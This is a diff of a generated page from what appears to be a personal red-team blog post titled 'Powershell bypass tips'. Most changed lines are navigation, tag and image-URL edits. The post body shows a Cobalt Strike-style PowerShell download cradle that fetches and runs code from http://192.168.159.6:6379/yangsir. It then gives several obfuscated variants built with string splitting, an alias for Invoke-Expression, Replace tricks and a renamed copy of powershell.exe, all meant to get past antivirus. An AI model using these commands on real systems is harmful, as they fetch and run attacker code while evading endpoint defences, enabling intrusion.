@@ -98,33 +98,22 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>About</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>Contact</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
     <a href="/friends" class="waves-effect waves-light">
       
       <i class="fas fa-address-book" style="zoom: 0.6;"></i>
       
       <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
     </a>
     
   </li>
@@ -201,33 +190,22 @@
         
         <li class="m-nav-item">
 	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			About
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			Contact
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
 		<a href="/friends" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-address-book"></i>
 			
 			Friends
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
 		</a>
           
         </li>
@@ -308,10 +286,23 @@
 </header>
 
     
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20tips/image-20210811151247591.png')">
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20tips/image-20210811151247591.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -436,12 +427,12 @@
                                 <span class="chip bg-color">Redteam</span>
                             </a>
                         
-                            <a href="/tags/RCE/">
-                                <span class="chip bg-color">RCE</span>
-                            </a>
-                        
                             <a href="/tags/Bypass/">
                                 <span class="chip bg-color">Bypass</span>
+                            </a>
+                        
+                            <a href="/tags/RCE/">
+                                <span class="chip bg-color">RCE</span>
                             </a>
                         
                             <a href="/tags/Powershell/">
@@ -480,7 +471,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2021-08-11
+                    2021-09-10
                 </div>
                 
 
@@ -520,18 +511,18 @@
                 <h2 id="Command-EXEC"><a href="#Command-EXEC" class="headerlink" title="Command EXEC"></a>Command EXEC</h2><pre class="line-numbers language-none"><code class="language-none">String Add the &amp;
 &amp;“hostname”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20tips/image-20210810164359366.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20tips/image-20210810164359366.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">IEX()、Invoke-Expression() command exec
 IEX(&quot;whoami&quot;)
 Invoke-Expression(&quot;whoami&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20tips/image-20210810164539173.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20tips/image-20210810164539173.png"></p>
 <h2 id="Cobaltstrike-Online"><a href="#Cobaltstrike-Online" class="headerlink" title="Cobaltstrike Online"></a>Cobaltstrike Online</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">The default payload like this
 powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>nop <span class="token operator">-</span>w hidden <span class="token operator">-</span>c <span class="token string">"IEX ((new-object net.webclient).downloadstring('http://192.168.159.6:6379/yangsir'))"</span>
 
 Must be <span class="token function">kill</span> By AV<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20tips/image-20210811131954127.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20tips/image-20210811131954127.png"></p>
 <h3 id="How-to-bypass"><a href="#How-to-bypass" class="headerlink" title="How to bypass"></a>How to bypass</h3><h4 id="The-string-Split"><a href="#The-string-Split" class="headerlink" title="The string Split"></a>The string Split</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>downloadstring<span class="token punctuation">(</span><span class="token string">'http://192.168.159.6:6379/yangsir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 
 <span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>‘new<span class="token operator">-</span>’<span class="token operator">+</span>‘object’ net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>‘downl’<span class="token operator">+</span>‘oadstring’<span class="token punctuation">(</span><span class="token string">'http://192.168.159.6:6379/yangsir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -564,16 +555,16 @@ powershell.exe $t1='</span><span class="token function">IEX</span> <span class="
 
 powershell<span class="token punctuation">.</span>exe <span class="token function">set-alias</span> <span class="token operator">-</span>name test <span class="token operator">-</span>value <span class="token function">Invoke-Expression</span><span class="token punctuation">;</span>test<span class="token punctuation">(</span><span class="token function">New-Object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'http://192.168.159.6:6379/yangsir'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20tips/image-20210811144222680.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20tips/image-20210811144222680.png"></p>
 <h5 id="Another"><a href="#Another" class="headerlink" title="Another"></a>Another</h5><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell<span class="token punctuation">.</span>exe <span class="token function">set-alias</span> <span class="token operator">-</span>name name1 <span class="token operator">-</span>value <span class="token function">Invoke-Expression</span><span class="token punctuation">;</span><span class="token string">"<span class="token variable">$t1</span>='name1((new-object net.webclient).downl';<span class="token variable">$t2</span>='oannn(''http://192.168.159.6:6379/yangsir''))'.Replace('nnn','dString');<span class="token variable">$t3</span>=<span class="token variable">$t1</span>,<span class="token variable">$t2</span>;<span class="token variable">$tfin</span>=<span class="token variable">$t3</span>;name1(-join <span class="token variable">$tfin</span>)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20tips/image-20210811151247591.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20tips/image-20210811151247591.png"></p>
 <h4 id="Copy-PS-exec"><a href="#Copy-PS-exec" class="headerlink" title="Copy PS exec"></a>Copy PS exec</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">copy</span> C:\Windows\System32\WindowsPowerShell\v1<span class="token punctuation">.</span>0\powershell<span class="token punctuation">.</span>exe whoami<span class="token punctuation">.</span>txt
 
 whoami<span class="token punctuation">.</span>txt <span class="token function">set-alias</span> <span class="token operator">-</span>name name1 <span class="token operator">-</span>value <span class="token function">Invoke-Expression</span><span class="token punctuation">;</span><span class="token string">"<span class="token variable">$t1</span>='name1((new-object net.webclient).downl';<span class="token variable">$t2</span>='oannn(''http://192.168.159.6:6379/yangsir''))'.Replace('nnn','dString');<span class="token variable">$t3</span>=<span class="token variable">$t1</span>,<span class="token variable">$t2</span>;<span class="token variable">$tfin</span>=<span class="token variable">$t3</span>;name1(-join <span class="token variable">$tfin</span>)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20tips/image-20210811151557751.png"></p>
-<h4 id="Too-long-command"><a href="#Too-long-command" class="headerlink" title="Too long command"></a>Too long command</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20tips/image-20210811151807654.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20tips/image-20210811151557751.png"></p>
+<h4 id="Too-long-command"><a href="#Too-long-command" class="headerlink" title="Too long command"></a>Too long command</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20tips/image-20210811151807654.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">Also you can use the too long command + copyPS + confusion to Combined use<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
@@ -644,12 +635,12 @@ whoami<span class="token punctuation">.</span>txt <span class="token function">s
                                     <span class="chip bg-color">Redteam</span>
                                 </a>
                             
-                                <a href="/tags/RCE/">
-                                    <span class="chip bg-color">RCE</span>
-                                </a>
-                            
                                 <a href="/tags/Bypass/">
                                     <span class="chip bg-color">Bypass</span>
+                                </a>
+                            
+                                <a href="/tags/RCE/">
+                                    <span class="chip bg-color">RCE</span>
                                 </a>
                             
                                 <a href="/tags/Powershell/">
@@ -710,7 +701,7 @@ whoami<span class="token punctuation">.</span>txt <span class="token function">s
                 <a href="/2021/08/16/adcs-esc1-esc8-gong-ji-fang-shi/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816200142115.png" class="responsive-img" alt="ADCS&amp;ESC1&amp;ESC8攻击方式">
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210816200142115.png" class="responsive-img" alt="ADCS&amp;ESC1&amp;ESC8攻击方式">
                         
                         <span class="card-title">ADCS&amp;ESC1&amp;ESC8攻击方式</span>
                     </div>
@@ -740,12 +731,16 @@ whoami<span class="token punctuation">.</span>txt <span class="token function">s
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Domain-environment/">
-                        <span class="chip bg-color">Domain environment</span>
-                    </a>
-                    
                     <a href="/tags/Redteam/">
                         <span class="chip bg-color">Redteam</span>
+                    </a>
+                    
+                    <a href="/tags/Domain-Environment/">
+                        <span class="chip bg-color">Domain Environment</span>
+                    </a>
+                    
+                    <a href="/tags/PTT/">
+                        <span class="chip bg-color">PTT</span>
                     </a>
                     
                     <a href="/tags/DPE/">
@@ -764,10 +759,6 @@ whoami<span class="token punctuation">.</span>txt <span class="token function">s
                         <span class="chip bg-color">ESC8</span>
                     </a>
                     
-                    <a href="/tags/PTT/">
-                        <span class="chip bg-color">PTT</span>
-                    </a>
-                    
                 </div>
                 
             </div>
@@ -782,7 +773,7 @@ whoami<span class="token punctuation">.</span>txt <span class="token function">s
                 <a href="/2021/08/08/use-ipc-bypassuac/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Use%20IPC%20BypassUAC/image-20210808150507232.png" class="responsive-img" alt="Use IPC BypassUAC">
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Use%20IPC%20BypassUAC/image-20210808150507232.png" class="responsive-img" alt="Use IPC BypassUAC">
                         
                         <span class="card-title">Use IPC BypassUAC</span>
                     </div>
@@ -1056,7 +1047,7 @@ whoami<span class="token punctuation">.</span>txt <span class="token function">s
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2021</span>
+                <span id="year">2021-2022</span>
             
             <span id="year">2021</span>
             <a href="/about" target="_blank">Yangsir</a>
@@ -1065,7 +1056,7 @@ whoami<span class="token punctuation">.</span>txt <span class="token function">s
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">13.8k</span>&nbsp;字
+                class="white-color">62.8k</span>&nbsp;字
             
             
             
